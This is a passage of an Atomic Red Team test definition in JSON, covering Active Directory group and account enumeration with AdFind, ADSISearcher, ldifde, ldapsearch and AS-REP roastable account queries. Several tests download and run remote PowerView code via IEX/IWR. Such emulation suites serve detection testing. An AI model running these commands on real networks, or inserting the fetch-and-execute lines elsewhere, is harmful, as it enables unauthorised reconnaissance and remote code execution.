                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "optional_args": {
                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
                                "type": "string",
                                "default": null
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args}\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Enumerate Active Directory Groups with Get-AdGroup",
                        "auto_generated_guid": "3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8",
                        "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "name": "powershell",
                            "command": "Get-AdGroup -Filter *\n"
                        }
                    },
                    {
                        "name": "Enumerate Active Directory Groups with ADSISearcher",
                        "auto_generated_guid": "9f4e344b-8434-41b3-85b1-d38f29d148d0",
                        "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n"
                        }
                    },
                    {
                        "name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)",
                        "auto_generated_guid": "43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8",
                        "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Computer must be domain joined.\n",
                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually.\n"
                            },
                            {
                                "description": "Requires the Active Directory module for powershell to be installed.\n",
                                "prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n"
                        }
                    },
                    {
                        "name": "Get-DomainGroupMember with PowerView",
                        "auto_generated_guid": "46352f40-f283-4fe5-b56d-d9a71750e145",
                        "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Get-DomainGroup with PowerView",
                        "auto_generated_guid": "5a8a181c-2c8e-478d-a943-549305a01230",
                        "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Active Directory Enumeration with LDIFDE",
                        "auto_generated_guid": "22cf8cb9-adb1-4e8c-80ca-7c723dfc8784",
                        "description": "Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "output_path": {
                                "description": "Path to the file that ldifde will output",
                                "type": "path",
                                "default": "C:\\Windows\\temp"
                            },
                            "output_file": {
                                "description": "The filename to be created by ldifde",
                                "type": "string",
                                "default": "atomic_ldifde.txt"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "PowerShell ActiveDirectory Module must be installed\n",
                                "prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n",
                                "get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
                            }
                        ],
                        "executor": {
                            "elevation_required": true,
                            "command": "ldifde.exe -f #{output_path}\\#{output_file} -p subtree\n",
                            "cleanup_command": "del #{output_path}\\#{output_file}\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS",
                        "auto_generated_guid": "d58d749c-4450-4975-a9e9-8b1d562755c2",
                        "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "domain": {
                                "description": "The domain to be tested",
                                "type": "string",
                                "default": "example"
                            },
                            "top_level_domain": {
                                "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
                                "type": "string",
                                "default": "com"
                            },
                            "user": {
                                "description": "username@domain of a user",
                                "type": "string",
                                "default": "user@example.com"
                            },
                            "password": {
                                "description": "password of the user referenced inside user",
                                "type": "string",
                                "default": "s3CurePssw0rD!"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
                                "prereq_command": "which ldapsearch\n",
                                "get_prereq_command": "echo missing ldapsearch command; exit 1\n"
                            }
                        ],
                        "executor": {
                            "elevation_required": false,
                            "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n",
                            "name": "sh"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 12:13:24"
}